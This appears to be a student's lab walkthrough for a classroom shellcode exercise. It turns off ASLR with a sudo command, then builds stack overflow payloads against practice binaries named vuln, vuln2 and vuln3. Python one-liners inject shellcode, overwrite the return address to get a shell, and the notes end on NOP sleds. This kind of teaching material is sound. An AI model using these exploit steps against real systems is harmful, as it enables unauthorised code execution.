1) Go to intranet.cs.usna.edu/~m152196/iwg/shellcode_lesson
2) Download all files
3) Disable ASLR with:
    $ echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
    (re-enable later by replacing the 0 with 1)

./vuln
------
Doing
    $ ./vuln $(python -c "print 'A'*44+'\xef\xbe\xad\xde'")
    $ dmesg | tail -n 1
shows that ./vuln's IP is overwritten with a 44 byte offset (IP is at bytes 45
and 46). We want to insert some shellcode and set the IP so that we jump to the shellcode.
Luckily, Aaron already supplied us some shellcode in the small-shell file. We just need to
insert it into that 44-byte buffer.
vuln2 is particularly nice because it prints out where the buffer is stored in memory. So:
    $ ./vuln2 $(python -c "sh=open('small-shell').read().strip(); print sh + (44 - len(sh)) * 'A' + '\xaa\xaa\xaa\xaa'")
gives me: "buf @ 0xffffd060" (as well as some silly A's and weird characters). Thus, I can
jump to the start of the buffer with:
    $ ./vuln2 $(python -c "sh=open('small-shell').read().strip(); print sh + (44 - len(sh)) * 'A' '\x60\xd0\xff\xff'")
NOTE: everybody will have different addresses that they need to jump to. So, when
substituting in the buffer address, just remember to do it in little-endian format.

vuln3 has this weird thing where you'll segfault at both 260 A's + an address and at 268 A's + an address. You want the 268 (you would figure this out with trial-and-error IRL.)
Nevertheless, I was able to get shell with:
    $ ./vuln3.kFegTa $(python -c "sh=open('small-shell').read().strip(); print sh + 'A' * (268-len(sh)) + '\x90\xce\xff\xff'")

In real life, you won't have ASLR turned off, which makes this sort of thing much harder.
Also, it may require some gdb and some math to figure out what you need to set the IP to.
Also, you generally add in nop sleds as well. The nops provide a region that you can jump to
which will bring you right into the shellcode. A nop is 0x90. The bigger your sled, the 
easier it is to get to a memory address on the sled. In all, your package will look like:
    SHELLCODE + NOPS + JUNK + MEMADDRESS
